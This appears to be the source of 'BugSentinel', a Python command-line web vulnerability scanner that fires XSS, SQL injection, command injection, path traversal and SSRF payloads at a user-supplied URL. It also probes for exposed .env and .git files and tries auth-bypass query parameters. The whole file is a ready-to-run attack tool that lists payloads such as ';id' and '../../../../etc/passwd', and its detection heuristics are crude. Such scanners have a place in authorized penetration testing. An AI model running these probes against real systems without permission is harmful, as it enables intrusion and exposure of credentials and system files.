#!/usr/bin/env python3
# BugSentinel Final - Smart Web Vulnerability Scanner

import requests
import re
import sys
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, parse_qsl
from colorama import init, Fore
init(autoreset=True)

# Default payloads
DEFAULT_PAYLOADS = {
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
    "sqli": ["' OR '1'='1", "';--", "\" OR 1=1 --"],
    "rce": [";id", "&& whoami", "| ls"],
    "lfi": ["../../../../etc/passwd", "..%2f..%2fetc/passwd"]
}

# Payloads from file (optional)
CUSTOM_PAYLOADS = []

def extract_params(url):
    parsed = urlparse(url)
    return dict(parse_qsl(parsed.query))

def inject_param(url, param, payload):
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query))
    query[param] = payload
    new_query = urlencode(query)
    return parsed._replace(query=new_query).geturl()

def load_custom_payloads(file):
    try:
        with open(file, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Loaded {len(lines)} custom payloads.")
            return lines
    except:
        print(Fore.RED + f"[!] Failed to load payloads from {file}")
        return []

def scan_all_injections(url, custom_payloads):
    if not extract_params(url):
        print(Fore.YELLOW + "[!] No parameter found. Skipping injection scan.")
        return

    for attack_type in ["xss", "sqli", "rce", "lfi"]:
        print(Fore.CYAN + f"[*] Scanning for {attack_type.upper()}...")

        payloads = DEFAULT_PAYLOADS[attack_type]
        if custom_payloads:
            payloads += custom_payloads  # Combine default + custom

        for payload in payloads:
            for param in extract_params(url):
                test_url = inject_param(url, param, payload)
                try:
                    r = requests.get(test_url, timeout=5)
                    if attack_type == "xss" and payload.lower() in r.text.lower():
                        print(Fore.RED + f"[!] XSS Detected at {test_url}")
                    elif attack_type == "sqli" and re.search("sql|mysql|syntax|ORA-", r.text, re.I):
                        print(Fore.RED + f"[!] SQLi Detected at {test_url}")
                    elif attack_type == "rce" and re.search("uid=|gid=|user|root", r.text):
                        print(Fore.RED + f"[!] RCE Detected at {test_url}")
                    elif attack_type == "lfi" and "root:x:" in r.text:
                        print(Fore.RED + f"[!] LFI Detected at {test_url}")
                except:
                    continue

def scan_sensitive_files(base_url):
    print(Fore.CYAN + "[*] Scanning for Sensitive Files...")
    paths = [".env", ".git/config", "backup.zip", "db.sql", "config.php~"]
    for path in paths:
        full = urljoin(base_url + "/", path)
        try:
            r = requests.get(full, timeout=5)
            if r.status_code == 200 and len(r.text) > 20:
                print(Fore.RED + f"[!] Sensitive File: {full}")
        except:
            continue

def scan_auth_bypass(url):
    print(Fore.CYAN + "[*] Scanning for Auth Bypass...")
    payloads = ["admin=true", "role=admin", "isadmin=1", "auth=1"]
    for p in payloads:
        test_url = url + ("?" if "?" not in url else "&") + p
        try:
            r = requests.get(test_url, timeout=5)
            if "logout" in r.text.lower() or "dashboard" in r.url:
                print(Fore.RED + f"[!] Possible Auth Bypass: {test_url}")
        except:
            continue

def scan_headers(url):
    print(Fore.CYAN + "[*] Scanning Security Headers...")
    try:
        r = requests.get(url, timeout=5)
        headers = r.headers
        missing = [h for h in [
            "Content-Security-Policy", "Strict-Transport-Security",
            "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"
        ] if h not in headers]
        if missing:
            print(Fore.YELLOW + f"[!] Missing Headers: {', '.join(missing)}")
        else:
            print(Fore.GREEN + "[+] All security headers present.")
    except:
        pass

def fingerprint_server(url):
    print(Fore.CYAN + "[*] Fingerprinting Server...")
    try:
        r = requests.get(url, timeout=5)
        print(Fore.YELLOW + f"  Server: {r.headers.get('Server', 'Unknown')}")
        print(Fore.YELLOW + f"  Powered By: {r.headers.get('X-Powered-By', 'Unknown')}")
        if "wordpress" in r.text.lower(): print(Fore.GREEN + "[!] WordPress detected")
    except:
        pass

def check_directory_listing(url):
    print(Fore.CYAN + "[*] Checking Directory Listing...")
    try:
        r = requests.get(url, timeout=5)
        if "Index of /" in r.text:
            print(Fore.RED + f"[!] Directory Listing Enabled: {url}")
    except:
        pass

def ssrf_check(url):
    print(Fore.CYAN + "[*] SSRF Basic Check...")
    ssrf_payloads = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254"]
    if not extract_params(url):
        return
    param = list(extract_params(url))[0]
    for p in ssrf_payloads:
        try:
            test_url = inject_param(url, param, p)
            r = requests.get(test_url, timeout=5)
            if "root" in r.text or r.status_code == 500:
                print(Fore.RED + f"[!] Possible SSRF: {test_url}")
        except:
            continue

def main():
    if "-u" not in sys.argv:
        print("Usage: python3 bugsentinel.py -u https://target.com/ [-l payload.txt]")
        sys.exit(1)

    # Ambil target URL
    url = sys.argv[sys.argv.index("-u") + 1]
    if "?" not in url or not extract_params(url):
        print(Fore.YELLOW + "[!] No parameter found. Adding dummy param 'test=1'")
        url += "?test=1" if "?" not in url else "&test=1"

    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

    # Ambil payload file jika ada
    payload_file = None
    if "-l" in sys.argv:
        payload_file = sys.argv[sys.argv.index("-l") + 1]
        global CUSTOM_PAYLOADS
        CUSTOM_PAYLOADS = load_custom_payloads(payload_file)

    print(Fore.YELLOW + f"\n[+] Starting scan on: {url}")
    fingerprint_server(base)
    scan_headers(base)
    scan_sensitive_files(base)
    check_directory_listing(base)
    ssrf_check(url)
    scan_auth_bypass(url)
    scan_all_injections(url, CUSTOM_PAYLOADS)

if __name__ == "__main__":
    main()
